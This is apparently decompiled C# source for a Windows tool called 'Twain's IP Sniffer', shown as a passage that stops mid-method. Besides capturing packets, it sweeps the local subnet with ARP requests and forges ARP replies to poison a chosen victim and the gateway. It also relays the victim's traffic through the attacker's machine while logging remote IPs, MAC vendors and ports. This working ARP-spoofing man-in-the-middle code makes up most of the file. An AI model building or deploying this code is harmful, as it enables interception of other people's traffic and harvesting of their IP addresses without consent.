// Decompiled with JetBrains decompiler
// Type: Twain_s_IP_Sniffer.Form1
// Assembly: Twains IP Sniffer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E72FCB45-4D6A-40D7-9358-127F19A5779E
// Assembly location: C:\Users\xCreations\Desktop\IPSniffer\Twains IP Sniffer\bin\Debug\Twains IP Sniffer.exe

using MetroFramework;
using MetroFramework.Components;
using MetroFramework.Controls;
using MetroFramework.Forms;
using Newtonsoft.Json.Linq;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Twains_IP_Sniffer.Properties;

namespace Twain_s_IP_Sniffer
{
  public class Form1 : MetroForm
  {
    private MetroColorStyle[] themes = new MetroColorStyle[8]
    {
      MetroColorStyle.Blue,
      MetroColorStyle.Pink,
      MetroColorStyle.Magenta,
      MetroColorStyle.Red,
      MetroColorStyle.Orange,
      MetroColorStyle.Yellow,
      MetroColorStyle.Lime,
      MetroColorStyle.Green
    };
    private BindingList<PortObject> list2 = new BindingList<PortObject>();
    private int[] ports = new int[14]
    {
      21,
      23,
      25,
      89,
      110,
      139,
      445,
      1433,
      1521,
      1723,
      3306,
      3389,
      5900,
      8080
    };
    private BindingList<ListObject> list = new BindingList<ListObject>();
    private bool running = false;
    private string toIP = "";
    private string toMac = "";
    private bool isArpSpoofing = false;
    private string fromIP = "";
    private string fromMac = "";
    private string myMacAddress = "";
    private string gateway = "";
    private string machineIP = "";
    private BackgroundWorker arpbw = new BackgroundWorker();
    private bool waitForResponse = false;
    private bool ipOnline = false;
    private bool pingingIP = false;
    private bool scanningPort = false;
    private IContainer components = (IContainer) null;
    private string IP;
    private PortLookup pl;
    private MACLookup macl;
    private Thread mainThread;
    private IList<LivePacketDevice> allDevices;
    private List<string> domains;
    private List<string> localIPs1;
    private List<string> localIPs2;
    private PacketCommunicator communicator;
    private Dictionary<string, string> IPtoMac;
    private MetroStyleManager styleManager;
    private OpenFileDialog selectSavePath;
    private ContextMenuStrip contextMenuStrip1;
    private ToolStripMenuItem addLabelToolStripMenuItem;
    private ToolStripMenuItem copyIPToolStripMenuItem;
    private ToolStripMenuItem traceLocationToolStripMenuItem;
    private MetroLabel metroLabel24;
    private BackgroundWorker ipPinger;
    private MetroLabel metroLabel18;
    private MetroComboBox styleBox;
    private ToolStripMenuItem removeLabelToolStripMenuItem;
    private MetroTabControl tabControl;
    private MetroTabPage mainTab;
    private MetroPanel metroPanel5;
    private MetroButton startButton;
    private MetroPanel metroPanel4;
    private MetroButton browseButton;
    private MetroTextBox savePath;
    private MetroLabel metroLabel7;
    private MetroPanel metroPanel3;
    private MetroComboBox fromIPARP;
    private MetroComboBox toIPARP;
    private MetroLabel metroLabel5;
    private MetroLabel metroLabel1;
    private MetroToggle arpSpoofToggle;
    private MetroLabel metroLabel3;
    private MetroPanel metroPanel2;
    private MetroTextBox sourcePortBox;
    private MetroLabel metroLabel4;
    private MetroTextBox sourceIPBox;
    private MetroLabel metroLabel2;
    private MetroPanel metroPanel1;
    private MetroComboBox networkBox;
    private MetroLabel networkLabel;
    private MetroTabPage snifferTab;
    private MetroPanel metroPanel9;
    private MetroButton metroButton7;
    private MetroButton metroButton1;
    private MetroButton metroButton2;
    private DataGridView dataGridView1;
    private MetroButton refreshButton;
    private MetroTabPage locationTab;
    private MetroPanel metroPanel7;
    private MetroTile metroTile1;
    private MetroTextBox metroTextBox5;
    private MetroLabel metroLabel11;
    private MetroTextBox metroTextBox4;
    private MetroLabel metroLabel10;
    private MetroTextBox metroTextBox3;
    private MetroLabel metroLabel9;
    private MetroTextBox metroTextBox1;
    private MetroLabel metroLabel6;
    private MetroPanel metroPanel6;
    private MetroTextBox metroTextBox2;
    private MetroButton metroButton3;
    private MetroLabel metroLabel8;
    private MetroTabPage howToTab;
    private MetroPanel metroPanel12;
    private DataGridView dataGridView2;
    private MetroLabel metroLabel15;
    private MetroLabel metroLabel16;
    private MetroPanel metroPanel11;
    private MetroLabel metroLabel17;
    private MetroLabel metroLabel14;
    private MetroLabel metroLabel13;
    private MetroPanel metroPanel8;
    private MetroButton metroButton6;
    private MetroTextBox metroTextBox6;
    private MetroButton metroButton5;
    private MetroLabel metroLabel12;
    private MetroButton metroButton4;
    private MetroLabel metroLabel20;
    private PictureBox pictureBox1;
    private MetroTabPage metroTabPage1;

    public Form1()
    {
      this.InitializeComponent();
      this.StyleManager = this.styleManager;
      this.styleBox.Items.Add((object) "Blue");
      this.styleBox.Items.Add((object) "Pink");
      this.styleBox.Items.Add((object) "Magenta");
      this.styleBox.Items.Add((object) "Red");
      this.styleBox.Items.Add((object) "Orange");
      this.styleBox.Items.Add((object) "Yellow");
      this.styleBox.Items.Add((object) "Lime");
      this.styleBox.Items.Add((object) "Green");
      this.metroButton2.Enabled = false;
      if (Settings.Default.style == "")
        this.styleBox.SelectedItem = (object) "Green";
      else
        this.styleBox.SelectedItem = (object) Settings.Default.style;
      this.Text = this.Text + " v" + Program.oldVersion;
      this.refreshButton.Enabled = false;
      this.dataGridView2.Visible = false;
      this.dataGridView1.Visible = false;
      this.tabControl.SelectTab(0);
      if (System.IO.File.Exists(Settings.Default.savedPath))
      {
        this.savePath.Text = Settings.Default.savedPath;
      }
      else
      {
        string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Twain's IP Sniffer\\";
        System.IO.File.WriteAllText(str + "Labels.txt", "");
        this.savePath.Text = str + "Labels.txt";
        Settings.Default.savedPath = this.savePath.Text;
        Settings.Default.Save();
      }
      this.IPtoMac = new Dictionary<string, string>();
      this.dataGridView1.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.None;
      this.dataGridView1.AllowUserToResizeRows = false;
      this.dataGridView1.RowHeadersWidthSizeMode = DataGridViewRowHeadersWidthSizeMode.DisableResizing;
      this.toIPARP.DropDownStyle = ComboBoxStyle.DropDownList;
      this.fromIPARP.DropDownStyle = ComboBoxStyle.DropDownList;
      this.localIPs1 = new List<string>();
      this.localIPs2 = new List<string>();
      this.domains = new List<string>();
      this.allDevices = (IList<LivePacketDevice>) LivePacketDevice.AllLocalMachine;
      string[] strArray1 = new string[this.allDevices.Count];
      string[] strArray2 = Process.GetCurrentProcess().MainModule.FileName.Split('\\');
      string str1 = strArray2[strArray2.Length - 1];
      string[] strArray3 = Path.GetDirectoryName(Application.ExecutablePath).Split('\\');
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < strArray3.Length; ++index)
        stringBuilder.Append(strArray3[index] + "\\");
      this.macl = new MACLookup(stringBuilder.ToString() + "\\References\\Oui.dat");
      this.macl.loadFromFile();
      this.pl = new PortLookup(stringBuilder.ToString() + "\\References\\Ports.dat");
      this.pl.loadFromFile();
      this.metroButton4.Visible = false;
      if (this.allDevices.Count == 0)
      {
        int num = (int) MetroFramework.MetroMessageBox.Show((IWin32Window) this, "No Interfaces found - Make sure WinPcap is installed!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        Application.Exit();
      }
      else
      {
        for (int index = 0; index != this.allDevices.Count; ++index)
          strArray1[index] = this.allDevices[index].Description;
        this.networkBox.DataSource = (object) strArray1;
      }
      this.networkBox.SelectedIndex = 0;
      if (!Program.justUpdated)
        return;
      int num1 = (int) MessageBox.Show(Program.whatsNew, "What is new in v" + Program.oldVersion + "?", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void ARPPacketHandler(Packet packet)
    {
      if (packet.Ethernet.EtherType != EthernetType.Arp || packet.Ethernet.Arp.Operation != ArpOperation.Reply || this.localIPs1.Contains(packet.Ethernet.Arp.SenderProtocolIpV4Address.ToString()))
        return;
      this.localIPs1.Add(packet.Ethernet.Arp.SenderProtocolIpV4Address.ToString());
      this.localIPs2.Add(packet.Ethernet.Arp.SenderProtocolIpV4Address.ToString());
      this.IPtoMac.Add(packet.Ethernet.Arp.SenderProtocolIpV4Address.ToString(), packet.Ethernet.Source.ToString());
    }

    public void ARPListen(object sender, DoWorkEventArgs e)
    {
      try
      {
        int packets = (int) this.communicator.ReceivePackets(0, new HandlePacket(this.ARPPacketHandler));
      }
      catch (Exception ex)
      {
      }
    }

    private List<byte> MacToByteList(string mac)
    {
      mac = mac.Trim();
      List<byte> byteList = new List<byte>();
      string str1 = mac;
      char[] chArray = new char[1]{ ':' };
      foreach (string str2 in str1.Split(chArray))
        byteList.Add(Convert.ToByte(str2, 16));
      return byteList;
    }

    private List<byte> IPToByteList(string IP)
    {
      List<byte> byteList = new List<byte>();
      string str1 = IP;
      char[] chArray = new char[1]{ '.' };
      foreach (string str2 in str1.Split(chArray))
        byteList.Add(Convert.ToByte(str2, 10));
      return byteList;
    }

    private void UpdateUI(object sender, RunWorkerCompletedEventArgs e)
    {
      this.fromIPARP.DataSource = (object) this.localIPs1;
      this.toIPARP.DataSource = (object) this.localIPs2;
      this.fromIPARP.SelectedIndex = 0;
      this.toIPARP.SelectedIndex = 0;
      Cursor.Current = Cursors.Default;
      this.waitForResponse = false;
      this.startButton.Text = "Start Sniffing";
    }

    private void Send255ARPs(object sender, DoWorkEventArgs e)
    {
      this.localIPs1.Clear();
      this.localIPs2.Clear();
      this.IPtoMac.Clear();
      if (!this.domains.Contains(this.gateway))
        this.domains.Add(this.gateway);
      foreach (string domain in this.domains)
      {
        string str = domain.Substring(0, domain.LastIndexOf('.') + 1);
        for (int index = 1; index < (int) byte.MaxValue; ++index)
        {
          string IP = str + (object) index;
          MacAddress macAddress1 = new MacAddress(this.myMacAddress);
          MacAddress macAddress2 = new MacAddress("ff:ff:ff:ff:ff:ff");
          this.communicator.SendPacket(new PacketBuilder(new ILayer[2]
          {
            (ILayer) new EthernetLayer()
            {
              Source = macAddress1,
              Destination = macAddress2
            },
            (ILayer) new ArpLayer()
            {
              SenderHardwareAddress = new ReadOnlyCollection<byte>((IList<byte>) this.MacToByteList(this.myMacAddress)),
              SenderProtocolAddress = new ReadOnlyCollection<byte>((IList<byte>) this.IPToByteList(this.machineIP)),
              TargetHardwareAddress = new ReadOnlyCollection<byte>((IList<byte>) this.MacToByteList("00:00:00:00:00:00")),
              TargetProtocolAddress = new ReadOnlyCollection<byte>((IList<byte>) this.IPToByteList(IP)),
              Operation = ArpOperation.Request,
              ProtocolType = EthernetType.IpV4
            }
          }).Build(DateTime.Now));
          Thread.Sleep(10);
        }
        Thread.Sleep(1000);
      }
      Thread.Sleep(1000);
      this.communicator.Break();
      this.localIPs1.Sort();
      this.localIPs2.Sort();
    }

    private void arpSpoofToggle_CheckedChanged(object sender, EventArgs e)
    {
      this.waitForResponse = true;
      this.startButton.Text = "Wait...";
      if (this.arpSpoofToggle.Checked)
      {
        if (this.myMacAddress.Split(':').Length == 6)
        {
          Cursor.Current = Cursors.WaitCursor;
          this.IPtoMac.Clear();
          this.localIPs1.Clear();
          this.localIPs2.Clear();
          this.communicator = this.allDevices[this.DropdownIndex()].Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1);
          BackgroundWorker backgroundWorker1 = new BackgroundWorker();
          backgroundWorker1.DoWork += new DoWorkEventHandler(this.ARPListen);
          backgroundWorker1.RunWorkerAsync();
          BackgroundWorker backgroundWorker2 = new BackgroundWorker();
          backgroundWorker2.DoWork += new DoWorkEventHandler(this.Send255ARPs);
          backgroundWorker2.RunWorkerCompleted += new RunWorkerCompletedEventHandler(this.UpdateUI);
          backgroundWorker2.RunWorkerAsync();
          this.fromIPARP.Enabled = true;
          this.toIPARP.Enabled = true;
        }
        else
        {
          int num = (int) MetroFramework.MetroMessageBox.Show((IWin32Window) this, "Invalid Mac Address!\nSelect another Network Adapter. If available use:\n\"Network adapter 'Microsoft' on local host\"", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          this.arpSpoofToggle.Checked = false;
        }
      }
      else
      {
        this.fromIPARP.Enabled = false;
        this.toIPARP.Enabled = false;
        this.waitForResponse = false;
        this.startButton.Text = "Start Sniffing";
      }
    }

    private string GetMacAddress()
    {
      foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
      {
        foreach (IPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
        {
          if (unicastAddress.Address.ToString() == this.machineIP && this.machineIP != "0.0.0.0" && this.machineIP != "")
          {
            byte[] addressBytes = networkInterface.GetPhysicalAddress().GetAddressBytes();
            this.gateway = networkInterface.GetIPProperties().GatewayAddresses[0].Address.ToString();
            return BitConverter.ToString(addressBytes).Replace("-", ":");
          }
        }
      }
      return "";
    }

    private int DropdownIndex()
    {
      return this.networkBox.InvokeRequired ? (int) this.Invoke((Delegate) new Form1.DropdownIndexCallback(this.DropdownIndex)) : this.networkBox.SelectedIndex;
    }

    private void networkBox_SelectedIndexChanged(object sender, EventArgs e)
    {
      foreach (DeviceAddress address in this.allDevices[this.DropdownIndex()].Addresses)
      {
        int num;
        if (address.Address != null && address.Address.Family.ToString() == "Internet")
          num = address.Address.ToString().Split(' ').Length > 1 ? 1 : 0;
        else
          num = 0;
        if ((uint) num > 0U)
          this.machineIP = address.Address.ToString().Split(' ')[1];
      }
      this.myMacAddress = this.GetMacAddress();
    }

    private void browseButton_Click(object sender, EventArgs e)
    {
      this.selectSavePath = new OpenFileDialog();
      if (this.savePath.Text == "")
      {
        string[] strArray = Path.GetDirectoryName(Application.ExecutablePath).Split('\\');
        StringBuilder stringBuilder = new StringBuilder();
        for (int index = 0; index < strArray.Length; ++index)
          stringBuilder.Append(strArray[index] + "\\");
        this.selectSavePath.InitialDirectory = stringBuilder.ToString();
      }
      else
        this.selectSavePath.InitialDirectory = this.savePath.Text;
      this.selectSavePath.Title = "Select a .txt File";
      this.selectSavePath.CheckFileExists = true;
      this.selectSavePath.CheckPathExists = true;
      this.selectSavePath.DefaultExt = "txt";
      this.selectSavePath.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
      this.selectSavePath.FilterIndex = 2;
      if (this.selectSavePath.ShowDialog() == DialogResult.OK)
      {
        if (!this.selectSavePath.FileName.EndsWith(".txt"))
        {
          int num = (int) MetroFramework.MetroMessageBox.Show((IWin32Window) this, "Select a .txt File!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          return;
        }
        this.savePath.Text = this.selectSavePath.FileName;
      }
      Settings.Default.savedPath = this.selectSavePath.FileName;
      Settings.Default.Save();
    }

    private string DropdownValue2()
    {
      return this.toIPARP.InvokeRequired ? (string) this.Invoke((Delegate) new Form1.DropdownValue2Callback(this.DropdownValue2)) : (string) this.fromIPARP.SelectedValue;
    }

    private string DropdownValue3()
    {
      return this.toIPARP.InvokeRequired ? (string) this.Invoke((Delegate) new Form1.DropdownValue3Callback(this.DropdownValue3)) : (string) this.toIPARP.SelectedValue;
    }

    private void SendArp(object sender, DoWorkEventArgs e)
    {
      this.SendArpPacket(this.toMac, this.myMacAddress, this.myMacAddress, this.fromIP, this.toMac, this.toIP, "08 06 00 01 08 00 06 04 00 02");
      this.SendArpPacket(this.fromMac, this.myMacAddress, this.myMacAddress, this.toIP, this.fromMac, this.fromIP, "08 06 00 01 08 00 06 04 00 02");
      this.SendArpPacket(this.myMacAddress, this.myMacAddress, this.fromMac, this.fromIP, this.myMacAddress, this.machineIP, "08 06 00 01 08 00 06 04 00 02");
    }

    private void PacketForward(object sender, DoWorkEventArgs e)
    {
      Packet packet = e.Argument as Packet;
      if ((!(packet.Ethernet.IpV4.Source.ToString() == this.toIP) ? 0U : (packet.Ethernet.Source.ToString() != this.myMacAddress ? 1U : 0U)) > 0U)
      {
        byte[] buffer = packet.Buffer;
        string[] strArray1 = this.fromMac.Split(':');
        for (int index = 0; index < strArray1.Length; ++index)
          buffer[index] = Convert.ToByte("0x" + strArray1[index], 16);
        string[] strArray2 = this.myMacAddress.Split(':');
        for (int index = 0; index < strArray2.Length; ++index)
          buffer[index + 6] = Convert.ToByte("0x" + strArray2[index], 16);
        this.communicator.SendPacket(new Packet(buffer, DateTime.Now, DataLinkKind.Ethernet));
      }
      if ((!(packet.Ethernet.IpV4.Destination.ToString() == this.toIP) ? 0U : (packet.Ethernet.Source.ToString() != this.myMacAddress ? 1U : 0U)) > 0U)
      {
        byte[] buffer = packet.Buffer;
        string[] strArray1 = this.toMac.Split(':');
        for (int index = 0; index < strArray1.Length; ++index)
          buffer[index] = Convert.ToByte("0x" + strArray1[index], 16);
        string[] strArray2 = this.myMacAddress.Split(':');
        for (int index = 0; index < strArray2.Length; ++index)
          buffer[index + 6] = Convert.ToByte("0x" + strArray2[index], 16);
        this.communicator.SendPacket(new Packet(buffer, DateTime.Now, DataLinkKind.Ethernet));
      }
      if ((packet.Ethernet.EtherType != EthernetType.Arp ? 0 : (packet.Ethernet.Source.ToString() != this.myMacAddress ? 1 : 0)) == 0)
        return;
      BackgroundWorker backgroundWorker = new BackgroundWorker();
      backgroundWorker.DoWork += new DoWorkEventHandler(this.SendArp);
      backgroundWorker.RunWorkerAsync();
    }

    private bool PacketFilter(Packet packet)
    {
      return (!(this.sourcePortBox.Text != packet.Ethernet.IpV4.Udp.SourcePort.ToString()) || !(this.sourcePortBox.Text != "")) && (!(this.sourceIPBox.Text != packet.Ethernet.IpV4.Source.ToString()) || !(this.sourceIPBox.Text != ""));
    }

    private bool isARP(Packet packet)
    {
      return packet.Ethernet.EtherType == EthernetType.Arp;
    }

    private bool isMDNS(Packet packet)
    {
      return packet.Ethernet.IpV4.Udp.SourcePort.ToString() == "5353" && (packet.Ethernet.IpV4.Udp.DestinationPort.ToString() == "5353" && packet.Buffer.Length > 44) && packet.Buffer[44] == (byte) 0;
    }

    private void PacketHandler(Packet packet)
    {
      if (this.isArpSpoofing)
      {
        BackgroundWorker backgroundWorker = new BackgroundWorker();
        backgroundWorker.DoWork += new DoWorkEventHandler(this.PacketForward);
        backgroundWorker.RunWorkerAsync((object) packet);
      }
      IpV4Address ipV4Address;
      if (this.isARP(packet))
      {
        ipV4Address = packet.Ethernet.Arp.TargetProtocolIpV4Address;
        string str1 = ipV4Address.ToString();
        ipV4Address = packet.Ethernet.Arp.TargetProtocolIpV4Address;
        int length1 = ipV4Address.ToString().LastIndexOf('.');
        string str2 = str1.Substring(0, length1) + ".1";
        if (!this.domains.Contains(str2))
          this.domains.Add(str2);
        ipV4Address = packet.Ethernet.Arp.SenderProtocolIpV4Address;
        string str3 = ipV4Address.ToString();
        ipV4Address = packet.Ethernet.Arp.SenderProtocolIpV4Address;
        int length2 = ipV4Address.ToString().LastIndexOf('.');
        string str4 = str3.Substring(0, length2) + ".1";
        if (!this.domains.Contains(str4))
          this.domains.Add(str4);
      }
      if (!this.PacketFilter(packet))
        return;
      IpV4Datagram ipV4 = packet.Ethernet.IpV4;
      UdpDatagram udp = ipV4.Udp;
      ListObject listObject1 = new ListObject();
      ipV4Address = ipV4.Destination;
      listObject1.ipDest = ipV4Address.ToString();
      ipV4Address = ipV4.Source;
      listObject1.ipSource = ipV4Address.ToString();
      ListObject listObject2 = listObject1;
      if (listObject2.ipSource == this.machineIP || listObject2.ipSource == this.toIP)
      {
        listObject2.ipDisplay = listObject2.ipDest;
        listObject2.macAddress = packet.Ethernet.Destination.ToString();
        listObject2.macVendor = this.macl.lookup(listObject2.macAddress);
        ListObject listObject3 = listObject2;
        PortLookup pl1 = this.pl;
        ushort num = packet.Ethernet.IpV4.Udp.DestinationPort;
        string port1 = num.ToString();
        string str1 = pl1.lookup(port1);
        listObject3.protocol = str1;
        if (listObject2.protocol == "")
        {
          ListObject listObject4 = listObject2;
          PortLookup pl2 = this.pl;
          num = packet.Ethernet.IpV4.Udp.SourcePort;
          string port2 = num.ToString();
          string str2 = pl2.lookup(port2);
          listObject4.protocol = str2;
        }
      }
      else if (listObject2.ipDest == this.machineIP || listObject2.ipDest == this.toIP)
      {
        listObject2.ipDisplay = listObject2.ipSource;
        listObject2.macAddress = packet.Ethernet.Source.ToString();
        listObject2.macVendor = this.macl.lookup(listObject2.macAddress);
        ListObject listObject3 = listObject2;
        PortLookup pl1 = this.pl;
        ushort num = packet.Ethernet.IpV4.Udp.DestinationPort;
        string port1 = num.ToString();
        string str1 = pl1.lookup(port1);
        listObject3.protocol = str1;
        if (listObject2.protocol == "")
        {
          ListObject listObject4 = listObject2;
          PortLookup pl2 = this.pl;
          num = packet.Ethernet.IpV4.Udp.SourcePort;
          string port2 = num.ToString();
          string str2 = pl2.lookup(port2);
          listObject4.protocol = str2;
        }
      }
      else if (this.toIP != "")
      {
        listObject2.ipDisplay = this.toIP;
        listObject2.macAddress = "Multiple";
        listObject2.macVendor = "Multiple";
      }
      else
      {
        listObject2.ipDisplay = "Multiple";
        listObject2.macAddress = "Multiple";
        listObject2.macVendor = "Multiple";
      }
      string ipDisplay = listObject2.ipDisplay;
      using (StreamReader streamReader = new StreamReader(this.savePath.Text))
      {
        while (!streamReader.EndOfStream)
        {
          string str = streamReader.ReadLine();
          if (!string.IsNullOrEmpty(str) && str.IndexOf(ipDisplay, StringComparison.CurrentCultureIgnoreCase) >= 0)
            listObject2.label = str.Split(new string[1]
            {
              " - "
            }, StringSplitOptions.None)[0];
        }
        streamReader.Close();
      }
      BackgroundWorker backgroundWorker1 = new BackgroundWorker();
      backgroundWorker1.DoWork += new DoWorkEventHandler(this.AddToGrid);
      backgroundWorker1.RunWorkerAsync((object) listObject2);
    }

    private void RefreshGridIndex()
    {
      try
      {
        if (this.dataGridView1.InvokeRequired)
        {
          this.Invoke((Delegate) new Form1.RefreshGridCallback(this.RefreshGridIndex));
        }
        else
        {
          this.dataGridView1.Update();
          this.dataGridView1.EndEdit();
          this.dataGridView1.Refresh();
        }
      }
      catch (Exception ex)
      {
      }
    }

    private void GridThread(object sender, DoWorkEventArgs e)
    {
      this.RefreshGridIndex();
      Thread.Sleep(1000);
    }

    private void SetDS(BindingList<ListObject> list)
    {
      if (this.dataGridView1.InvokeRequired)
      {
        this.Invoke((Delegate) new Form1.SetDSCallback(this.SetDS), (object) list);
      }
      else
      {
        this.dataGridView1.DataSource = (object) null;
        this.dataGridView1.DataSource = (object) list;
        this.dataGridView1.Columns["ipDisplay"].HeaderText = "External IP";
        this.dataGridView1.Columns["macAddress"].HeaderText = "MAC Address";
        this.dataGridView1.Columns["macVendor"].HeaderText = "Hardware Vendor";
        this.dataGridView1.Columns["ipSource"].HeaderText = "IP Source";
        this.dataGridView1.Columns["ipDest"].HeaderText = "IP Destination";
        this.dataGridView1.Columns["portSource"].HeaderText = "Source Port";
        this.dataGridView1.Columns["portDest"].HeaderText = "Destination Port";
        this.dataGridView1.Columns["protocol"].HeaderText = "Protocol";
        this.dataGridView1.Columns["label"].HeaderText = "Label";
        this.dataGridView1.Columns["packetCount"].HeaderText = "Packets";
      }
    }

    private string CurrentGT()
    {
      try
      {
        return this.dataGridView1.InvokeRequired ? (string) this.Invoke((Delegate) new Form1.CurrentGTCallback(this.CurrentGT)) : (string) this.dataGridView1[0, this.dataGridView1.SelectedCells[0].RowIndex].Value;
      }
      catch (Exception ex)
      {
        return "";
      }
    }

    private string CurrentIP()
    {
      try
      {
        return this.dataGridView1.InvokeRequired ? (string) this.Invoke((Delegate) new Form1.CurrentIPCallback(this.CurrentIP)) : (string) this.dataGridView1[1, this.dataGridView1.SelectedCells[0].RowIndex].Value;
      }
      catch (Exception ex)
      {
        return "";
      }
    }

    private void ShowContextMenu(Point p)
    {
      if (this.contextMenuStrip1.InvokeRequired)
        this.Invoke((Delegate) new Form1.ShowContextMenuCallback(this.ShowContextMenu), (object) p);
      else
        this.contextMenuStrip1.Show((Control) this.dataGridView1, p);
    }

    private void dataGridView1_MouseUp(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Right)
        return;
      DataGridView.HitTestInfo hitTestInfo = this.dataGridView1.HitTest(e.X, e.Y);
      if (hitTestInfo.Type != DataGridViewHitTestType.Cell || (uint) this.dataGridView1.Rows.Count <= 0U)
        return;
      this.dataGridView1.CurrentCell = this.dataGridView1[hitTestInfo.ColumnIndex, hitTestInfo.RowIndex];
      this.ShowContextMenu(this.PointToScreen(this.dataGridView1.PointToClient(e.Location)));
    }

    private void AddGrid(ListObject obj)
    {
      try
      {
        if (this.dataGridView1.InvokeRequired)
        {
          this.Invoke((Delegate) new Form1.AddGridCallback(this.AddGrid), (object) obj);
        }
        else
        {
          bool flag = false;
          TimeSpan timeSpan = DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0);
          for (int index = 0; index < this.list.Count; ++index)
          {
            if (this.list[index].ipSource == obj.ipSource && this.list[index].ipDest == obj.ipDest)
            {
              flag = true;
              ++this.list[index].packetCount;
              this.list[index].packetDelt = timeSpan.Seconds;
            }
          }
          if (!flag)
          {
            obj.packetCount = 1;
            obj.packetDelt = timeSpan.Seconds;
            this.list.Add(obj);
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    private void AddGrid(object obj)
    {
      this.AddGrid((ListObject) obj);
    }

    private void AddToGrid(object sender, DoWorkEventArgs e)
    {
      ListObject listObject = e.Argument as ListObject;
      BackgroundWorker backgroundWorker = new BackgroundWorker();
      this.AddGrid(listObject);
    }

    public void Listen()
    {
      PacketDevice allDevice = (PacketDevice) this.allDevices[this.DropdownIndex()];
      this.SetDS(this.list);
      try
      {
        this.communicator = allDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1);
        if (this.isArpSpoofing)
        {
          this.arpbw.DoWork += new DoWorkEventHandler(this.SendArp);
          this.arpbw.RunWorkerAsync();
        }
        BackgroundWorker backgroundWorker = new BackgroundWorker();
        backgroundWorker.DoWork += new DoWorkEventHandler(this.GridThread);
        backgroundWorker.RunWorkerAsync();
        int packets = (int) this.communicator.ReceivePackets(0, new HandlePacket(this.PacketHandler));
      }
      catch (Exception ex)
      {
      }
    }

    private byte[] SendArpPacket(
      string destinationAddress,
      string sourceAddress,
      string sourcePhysics,
      string sourceIP,
      string destinationPhysics,
      string destinationIP,
      string filler)
    {
      List<byte> byteList = new List<byte>();
      string str1 = destinationAddress;
      char[] chArray1 = new char[1]{ ':' };
      foreach (string str2 in str1.Split(chArray1))
        byteList.Add(Convert.ToByte("0x" + str2, 16));
      string str3 = sourceAddress;
      char[] chArray2 = new char[1]{ ':' };
      foreach (string str2 in str3.Split(chArray2))
        byteList.Add(Convert.ToByte("0x" + str2, 16));
      string str4 = filler;
      char[] chArray3 = new char[1]{ ' ' };
      foreach (string str2 in str4.Split(chArray3))
        byteList.Add(Convert.ToByte("0x" + str2, 16));
      string str5 = sourcePhysics;
      char[] chArray4 = new char[1]{ ':' };
      foreach (string str2 in str5.Split(chArray4))
        byteList.Add(Convert.ToByte("0x" + str2, 16));
      string str6 = sourceIP;
      char[] chArray5 = new char[1]{ '.' };
      foreach (string str2 in str6.Split(chArray5))
        byteList.Add(Convert.ToByte(str2, 10));
      string str7 = destinationPhysics;
      char[] chArray6 = new char[1]{ ':' };
      foreach (string str2 in str7.Split(chArray6))
        byteList.Add(Convert.ToByte("0x" + str2, 16));
      string str8 = destinationIP;
      char[] chArray7 = new char[1]{ '.' };
      foreach (string str2 in str8.Split(chArray7))
        byteList.Add(Convert.ToByte(str2, 10));
      byte[] array = byteList.ToArray();
      string str9 = "";
      str9 = BitConverter.ToString(array);
      byte[] numArray1 = new byte[5];
      byte[] numArray2 = new byte[44]
      {
        (byte) 0,
        (byte) 29,
        (byte) 216,
        (byte) 178,
        (byte) 143,
        (byte) 66,
        (byte) 0,
        (byte) 35,
        (byte) 21,
        (byte) 85,
        (byte) 127,
        (byte) 152,
        (byte) 8,
        (byte) 6,
        (byte) 0,
        (byte) 1,
        (byte) 8,
        (byte) 0,
        (byte) 6,
        (byte) 4,
        (byte) 0,
        (byte) 2,
        (byte) 0,
        (byte) 35,
        (byte) 21,
        (byte) 85,
        (byte) 127,
        (byte) 152,
        (byte) 192,
        (byte) 168,
        (byte) 1,
        (byte) 1,
        (byte) 0,
        (byte) 29,
        (byte) 216,
        (byte) 178,
        (byte) 143,
        (byte) 66,
        (byte) 192,
        (byte) 168,
        (byte) 1,
        (byte) 31,
        (byte) 0,
        (byte) 0
      };
      Packet packet = new Packet(array, DateTime.Now, DataLinkKind.Ethernet);
      this.communicator.SendPacket(packet);
      return packet.Buffer;
    }

    private void SendReverseArpPackets()
    {
      this.SendArpPacket(this.toMac, this.myMacAddress, this.fromMac, this.fromIP, this.toMac, this.toIP, "08 06 00 01 08 00 06 04 00 02");
      this.SendArpPacket(this.fromMac, this.myMacAddress, this.toMac, this.toIP, this.fromMac, this.fromIP, "08 06 00 01 08 00 06 04 00 02");
    }

    private void startButton_Click(object sender, EventArgs e)
    {
      if (this.savePath.Text == "" && !this.running)
      {
        int num1 = (int) MetroFramework.MetroMessageBox.Show((IWin32Window) this, "Select a .txt File you want to save your Labels to!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (this.arpSpoofToggle.Checked && this.waitForResponse && !this.running)
      {
        int num2 = (int) MetroFramework.MetroMessageBox.Show((IWin32Window) this, "Wait till the ARP-Spoof-Range is loaded!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (!this.running)
      {
        if (this.arpSpoofToggle.Checked)
        {
          if (this.DropdownValue2() != "" && this.DropdownValue3() != "")
          {
            this.isArpSpoofing = true;
            this.fromIP = this.DropdownValue2();
            this.fromMac = this.IPtoMac[this.DropdownValue2()];
            this.toIP = this.DropdownValue3();
